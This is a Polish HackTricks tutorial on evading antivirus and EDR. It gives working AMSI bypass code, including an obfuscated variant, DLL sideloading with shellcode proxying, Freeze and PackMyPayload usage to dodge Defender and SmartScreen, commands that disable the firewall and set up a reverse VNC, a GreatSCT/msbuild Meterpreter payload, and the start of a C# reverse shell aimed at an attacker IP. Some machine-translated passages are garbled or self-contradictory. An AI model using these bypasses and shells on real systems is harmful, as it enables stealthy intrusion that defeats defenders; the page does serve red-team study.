# Unikanie wykrycia przez antywirusy (AV)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>

**Ta strona została napisana przez** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia unikania AV**

Obecnie antywirusy (AV) używają różnych metod sprawdzania, czy plik jest złośliwy czy nie, takich jak statyczne wykrywanie, dynamiczna analiza i dla bardziej zaawansowanych systemów EDR analiza behawioralna.

### **Statyczne wykrywanie**

Statyczne wykrywanie jest osiągane poprzez oznaczanie znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym lub skrypcie, a także wyodrębnianie informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że korzystanie z publicznie dostępnych narzędzi może prowadzić do łatwiejszego wykrycia, ponieważ prawdopodobnie zostały one przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego rodzaju wykrywania:

* **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, nie będzie możliwe wykrycie go przez AV, ale będziesz potrzebować pewnego rodzaju ładowacza do odszyfrowania i uruchomienia programu w pamięci.

* **Obfuskacja**

Czasami wystarczy zmienić niektóre ciągi znaków w pliku binarnym lub skrypcie, aby uniknąć wykrycia przez AV, ale może to być czasochłonne zadanie, w zależności od tego, co próbujesz zobfuskować.

* **Narzędzia niestandardowe**

Jeśli opracujesz własne narzędzia, nie będą znane żadne złośliwe sygnatury, ale wymaga to dużo czasu i wysiłku.

{% hint style="info" %}
Dobrym sposobem sprawdzania wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Program ten dzieli plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno, dzięki czemu można dokładnie określić, jakie ciągi znaków lub bajtów są oznaczone w pliku.
{% endhint %}

Gorąco polecam obejrzenie tej [playlisty na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) dotyczącej praktycznego unikania wykrycia przez AV.

### **Dynamiczna analiza**

Dynamiczna analiza polega na uruchomieniu twojego pliku binarnego w piaskownicy i obserwowaniu złośliwej aktywności (np. próbie odszyfrowania i odczytania haseł przeglądarki, wykonaniu minidumpa na LSASS itp.). Ta część może być nieco trudniejsza do pracy, ale oto kilka rzeczy, które możesz zrobić, aby uniknąć piaskownic.

* **Oczekiwanie przed wykonaniem** W zależności od tego, jak jest to zaimplementowane, może to być doskonały sposób na obejście dynamicznej analizy AV. AV ma bardzo krótki czas na skanowanie plików, aby nie przeszkadzać użytkownikowi w pracy, dlatego używanie długich oczekiwania może zakłócać analizę plików binarnych. Problem polega na tym, że wiele piaskownic AV może po prostu pominąć oczekiwanie, w zależności od tego, jak jest to zaimplementowane.
* **Sprawdzanie zasobów maszyny** Zazwyczaj piaskownice mają bardzo mało zasobów do pracy (np. <2 GB RAM), w przeciwnym razie mogłyby spowolnić pracę maszyny użytkownika. Tutaj możesz również być bardzo kreatywny, na przykład sprawdzając temperaturę procesora lub nawet prędkość wentylatorów, nie wszystko będzie zaimplementowane w piaskownicy.
* **Sprawdzanie specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stanowisko jest dołączone do domeny "contoso.local", możesz sprawdzić domenę komputera, aby sprawdzić, czy pasuje do podanej przez ciebie, jeśli nie, możesz zmusić program do zakończenia działania.

Okazuje się, że nazwa komputera w piaskownicy Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim złośliwym oprogramowaniu przed detonacją. Jeśli nazwa pasuje do HAL9TH, oznacza to, że znajdujesz się w piaskownicy Defendera, więc możesz zmusić program do zakończenia działania.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z piaskownicami

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej w tym poście, **publiczne narzędzia** w końcu zostaną **wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz wydobyć LSASS, **czy naprawdę musisz używać mimikatz**? Czy możesz użyć innego projektu, który jest mniej znany i również wydobywa LSASS.

Prawidłową odpowiedzią jest prawdopodobnie ta druga opcja. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z najbardziej oznaczonych przez AV i EDR szkodliwych programów, podczas gdy sam projekt jest super, jest również koszmarem w pracy z nim, aby ominąć AV, więc poszukaj alternatyw dla tego, czego próbujesz osiągnąć.

{% hint style="info" %}
Modyfikując swoje ładunki w celu uniknięcia wykrycia, upewnij się, że **wyłączasz automatyczne przesyłanie próbek** do defendera, a także, proszę, **NIE PRZEŁADOWUJ DO VIRUSTOTAL**, jeśli twoim celem jest osiągnięcie uniknięcia wykrycia na dłuższą metę. Jeśli chcesz sprawdzić, czy twój ładunek zostaje wykryty przez konkretny AV, zainstaluj go na maszyn
## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez ładowacz, umieszczając zarówno aplikację ofiarę, jak i złośliwe ładunki obok siebie.

Możesz sprawdzić, czy programy są podatne na DLL Sideloading, używając [Siofra](https://github.com/Cybereason/siofra) i następującego skryptu powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

To polecenie wyświetli listę programów podatnych na przechwycenie DLL w folderze "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Bardzo polecam **samodzielne zbadanie programów podatnych na przechwycenie DLL/Sideloadable**, ta technika jest dość skryta, jeśli jest poprawnie wykonana, ale jeśli używasz publicznie znanych programów Sideloadable DLL, możesz łatwo zostać wykryty.

Po prostu umieszczenie złośliwej DLL o oczekiwanej nazwie przez program nie spowoduje załadowania twojego ładunku, ponieważ program oczekuje pewnych określonych funkcji wewnątrz tej DLL. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwej) DLL do oryginalnej DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania twojego ładunku.

Będę korzystać z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które podjąłem:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Ostatnie polecenie dostarczy nam 2 pliki: szablon kodu źródłowego DLL i oryginalne przemianowane DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Oto wyniki:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Gorąco polecam** obejrzenie [twitch VOD S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading oraz [filmu ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE), aby dowiedzieć się więcej o tym, o czym rozmawialiśmy bardziej szczegółowo.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do łamania EDR za pomocą zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonania`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w dyskretny sposób.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Unikanie wykrycia to gra w kotka i myszkę, to co działa dzisiaj, może być wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu, jeśli to możliwe, spróbuj połączyć wiele technik unikania wykrycia.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI został stworzony w celu zapobiegania "[malware bez plików](https://en.wikipedia.org/wiki/Fileless\_malware)". Początkowo, programy antywirusowe były w stanie skanować **pliki na dysku**, więc jeśli można było jakoś uruchomić ładunki **bezpośrednio w pamięci**, program antywirusowy nie mógł nic zrobić, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana w następujące komponenty systemu Windows.

* Kontrola konta użytkownika, czyli UAC (podnoszenie uprawnień dla plików EXE, COM, MSI lub instalacji ActiveX)
* PowerShell (skrypty, interaktywne użycie i dynamiczna ocena kodu)
* Windows Script Host (wscript.exe i cscript.exe)
* JavaScript i VBScript
* Makra VBA w programie Office

Dzięki temu rozwiązaniu, rozwiązania antywirusowe mogą analizować zachowanie skryptów, ujawniając zawartość skryptów w formie niezaszyfrowanej i niezaciemnionej.

Uruchomienie polecenia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w programie Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Zauważ, jak dodaje przedrostek `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt, w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale i tak zostaliśmy wykryci w pamięci z powodu AMSI.

Istnieje kilka sposobów obejścia AMSI:

* **Zaciemnienie**

Ponieważ AMSI głównie działa na podstawie statycznych wykryć, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność do odszyfrowywania skryptów, nawet jeśli mają wiele warstw, dlatego zaciemnienie może być złym wyborem, w zależności od tego, jak jest wykonane. To sprawia, że unikanie wykrycia nie jest tak proste. Chociaż czasami wystarczy zmienić kilka nazw zmiennych i będzie dobrze, więc zależy to od tego, ile coś zostało oznaczone.

* **Ominięcie AMSI**

Ponieważ AMSI jest implementowane poprzez załadowanie DLL do procesu powershell (również cscript.exe, wscript.exe, itp.), łatwo można go naruszyć nawet jako użytkownik bez uprawnień. Ze względu na tę wadę w implementacji AMSI, badacze znaleźli wiele sposobów na unikanie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że żadne skanowanie nie zostanie uruchomione dla bieżącego procesu. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerokiemu wykorzystaniu.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Wystarczyła jedna linia kodu powershell, aby uniemożliwić użycie AMSI dla bieżącego procesu powershell. Oczywiście ta linia została wykryta przez sam AMSI, więc konieczne jest wprowadzenie pewnych modyfikacji, aby użyć tej techniki.

Oto zmodyfikowane obejście AMSI, które znalazłem w tym [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Modyfikacja pamięci**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/\_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w pliku amsi.dll (odpowiedzialnego za skanowanie dostarczonych przez użytkownika danych wejściowych) i nadpisaniu go instrukcjami zwracającymi kod dla E\_INVALIDARG. W ten sposób wynik rzeczywistego skanowania zostanie zwrócony jako 0, co jest interpretowane jako czysty wynik.

{% hint style="info" %}
Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) dla bardziej szczegółowego wyjaśnienia.
{% endhint %}

Istnieje również wiele innych technik używanych do omijania AMSI w PowerShell, sprawdź [**tę stronę**](basic-powershell-for-pentesters/#amsi-bypass) i [ten repozytorium](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się więcej na ten temat.

Lub ten skrypt, który za pomocą modyfikacji pamięci będzie modyfikował każde nowe Powersh

## Obfuskacja

Istnieje kilka narzędzi, które można użyć do **obfuskacji kodu C# w postaci tekstu jawnego**, generowania **szablonów metaprogramowania** do kompilacji binarnych lub **obfuskacji skompilowanych binarnych**, takich jak:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuskator C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartej wersji [pakietu kompilacyjnego LLVM](http://www.llvm.org/), który może zapewnić zwiększone bezpieczeństwo oprogramowania poprzez [obfuskację kodu](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) i zabezpieczanie przed ingerencją.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, zaszyfrowanego kodu bez użycia zewnętrznego narzędzia i bez modyfikowania kompilatora.
* [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę zaszyfrowanych operacji generowanych przez szablonowe metaprogramowanie w C++, co utrudnia osobie próbującej złamać aplikację.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuskator binarny x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to zaawansowany framework obfuskacji kodu na poziomie kodu asemblera dla języków obsługiwanych przez LLVM przy użyciu ROP (programowanie oparte na powrotach). ROPfuscator obfuskuje program na poziomie kodu asemblera, zamieniając zwykłe instrukcje na łańcuchy ROP, utrudniając naturalny przepływ sterowania.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to krypter .NET PE napisany w Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekształcić istniejące pliki EXE/DLL w kod shellcode, a następnie je załadować

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, który ma na celu ochronę użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen głównie działa na podstawie reputacji, co oznacza, że pobieranie niezwykłych aplikacji spowoduje uruchomienie SmartScreen, co ostrzeże i uniemożliwi użytkownikowi uruchomienie pliku (choć plik nadal można uruchomić, klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [Alternatywny Strumień Danych NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) o nazwie Zone.Identifier, który automatycznie tworzony jest podczas pobierania plików z internetu, wraz z adresem URL, z którego zostały pobrane.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Sprawdzanie alternatywnego strumienia danych Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

{% hint style="info" %}
Warto zauważyć, że pliki wykonywalne podpisane **zaufanym** certyfikatem **nie uruchamiają SmartScreen**.
{% endhint %}

Bardzo skutecznym sposobem na uniknięcie oznaczenia Mark of The Web dla twoich payloadów jest umieszczenie ich wewnątrz jakiegoś rodzaju kontenera, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **nie NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby uniknąć oznaczenia Mark-of-the-Web.

Przykładowe użycie:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo omijania SmartScreen poprzez umieszczanie ładunków wewnątrz plików ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Refleksja zestawu C#

Ładowanie binarnych plików C# w pamięci jest znane od dłuższego czasu i wciąż jest bardzo dobrym sposobem na uruchamianie narzędzi po eksploatacji bez wykrycia przez AV.

Ponieważ ładunek zostanie załadowany bezpośrednio do pamięci bez dotykania dysku, będziemy musieli jedynie martwić się o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itp.) już umożliwia wykonanie zestawów C# bezpośrednio w pamięci, ale istnieją różne sposoby na to:

* **Fork\&Run**

Polega na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu złośliwego kodu po eksploatacji do tego nowego procesu, wykonaniu złośliwego kodu i po zakończeniu zabicia nowego procesu. Metoda fork and run ma swoje zalety i wady. Zaletą tej metody jest to, że wykonanie odbywa się **poza** naszym procesem implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte w naszej akcji po eksploatacji, istnieje **dużo większa szansa** na **przeżycie implantu**. Wada polega na **większym ryzyku** wykrycia przez **wykrywanie zachowań**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Polega na wstrzyknięciu złośliwego kodu po eksploatacji **do własnego procesu**. W ten sposób można uniknąć konieczności tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania ładunku, istnieje **dużo większa szansa** na **utratę beaconu**, ponieważ może on ulec awarii.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Jeśli chcesz dowiedzieć się więcej o ładowaniu zestawów C#, zapoznaj się z tym artykułem [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Można również ładować zestawy C# **z poziomu PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Użycie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu za pomocą innych języków, udostępniając zainfekowanemu komputerowi dostęp **do środowiska interpretera zainstalowanego na kontrolowanym przez atakującego udziale SMB**.&#x20;

Pozwalając na dostęp do binarnych interpreterów i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zainfekowanego komputera.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale korzystając z Go, Java, PHP itp. mamy **większą elastyczność w omijaniu statycznych sygnatur**. Testowanie losowych niezobfuskowanych skryptów powrotnych powłok w tych językach okazało się skuteczne.

## Zaawansowane unikanie

Unikanie jest bardzo skomplikowanym tematem, czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest całkowite pozostanie niewykrytym w dojrzałych środowiskach.

Każde środowisko, z którym się spotykasz, ma swoje własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tej prezentacji od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki unikania.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

To również kolejna świetna prezentacja od [@mariuszbit](https://twitter.com/mariuszbit) na temat unikania w głębi.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Stare techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usunie części binarne**, aż **dowie się, którą część Defender** uznaje za złośliwą i podzieli ją dla ciebie.\
Inne narzędzie, które robi **to samo, to** [**avred**](https://github.com/dobin/avred) z otwartą usługą w sieci [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 wszystkie wersje systemu Windows miały **serwer Telnet**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Uruchom go **automatycznie** przy uruchamianiu systemu i **uruchom** go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz zaporę ogniową:

Aby zwiększyć bezpieczeństwo, zaleca się zmianę domyślnego portu telnet. Możesz to zrobić, edytując plik konfiguracyjny usługi telnet i zmieniając wartość portu na inny niż domyślny. Należy pamiętać, że porty poniżej 1024 są zarezerwowane dla uprzywilejowanych usług systemowych, dlatego warto wybrać port spoza tego zakresu.

Dodatkowo, wyłączenie zapory ogniowej może zwiększyć podatność na ataki, dlatego zaleca się zachowanie ostrożności i przemyślane podejście do tej decyzji. Jeśli jednak zdecydujesz się wyłączyć zaporę ogniową, upewnij się, że masz inne środki bezpieczeństwa, które zabezpieczą Twoją sieć przed nieautoryzowanym dostępem.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz go z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz pobrać pliki binarne, a nie instalator)

**NA HOSTINGU**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

* Włącz opcję _Disable TrayIcon_
* Ustaw hasło w _VNC Password_
* Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ do **ofiary**

#### **Połączenie odwrotne**

**Atakujący** powinien **uruchomić** na swoim **hostingu** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do przechwycenia odwrotnego połączenia **VNC**. Następnie, w **ofierze**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <adres_ip_atakującego>::5900`

**OSTRZEŻENIE:** Aby utrzymać ukrycie, nie wykonuj kilku czynności

* Nie uruchamiaj `winvnc`, jeśli już działa, w przeciwnym razie wywołasz [okienko](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa za pomocą `tasklist | findstr winvnc`
* Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, w przeciwnym razie spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
* Nie uruchamiaj `winvnc -h` w celu uzyskania pomocy, w przeciwnym razie wywołasz [okienko](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz go z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:

GreatSCT to narzędzie, które umożliwia tworzenie skryptów do omijania ochrony antywirusowej. Działa na platformie PowerShell i oferuje wiele funkcji, które mogą być wykorzystane do tworzenia zaawansowanych technik omijania AV.

### Tworzenie skryptów

GreatSCT umożliwia tworzenie skryptów w języku PowerShell, które mogą być używane do omijania ochrony antywirusowej. Można tworzyć skrypty, które wykorzystują różne techniki, takie jak kodowanie, szyfrowanie i zmienianie nazw plików, aby uniknąć wykrycia przez AV.

### Generowanie payloadów

GreatSCT pozwala na generowanie payloadów, które mogą być używane do wykonywania różnych działań, takich jak zdalne uruchamianie kodu, przechwytywanie ekranu, przechwytywanie dźwięku itp. Payloady są generowane w taki sposób, aby omijać ochronę antywirusową i umożliwiać wykonanie żądanych działań na celu.

### Testowanie skuteczności

GreatSCT oferuje również narzędzia do testowania skuteczności omijania ochrony antywirusowej. Można użyć tych narzędzi, aby sprawdzić, czy stworzone skrypty i payloady są w stanie uniknąć wykrycia przez AV. Testowanie skuteczności jest ważne, aby upewnić się, że nasze techniki omijania AV są skuteczne i nie zostaną wykryte.

### Integracja z innymi narzędziami

GreatSCT może być również zintegrowane z innymi narzędziami, takimi jak Metasploit, aby umożliwić bardziej zaawansowane ataki. Można użyć GreatSCT do generowania payloadów, które mogą być wykorzystane w atakach za pomocą Metasploit, co zwiększa skuteczność ataku i umożliwia omijanie ochrony antywirusowej.

GreatSCT jest potężnym narzędziem, które może być wykorzystane do tworzenia zaawansowanych technik omijania ochrony antywirusowej. Dzięki jego funkcjom i możliwościom, jest to narzędzie, które powinno być brane pod uwagę przez każdego hakerów, którzy chcą unikać wykrycia przez AV i przeprowadzać skuteczne ataki.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą polecenia `msfconsole -r file.rc` i **wykonaj** **payload xml** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny obrońca szybko zakończy proces.**

### Kompilowanie naszego własnego odwróconego powłoki

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwsza odwrócona powłoka C#

Skompiluj to za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
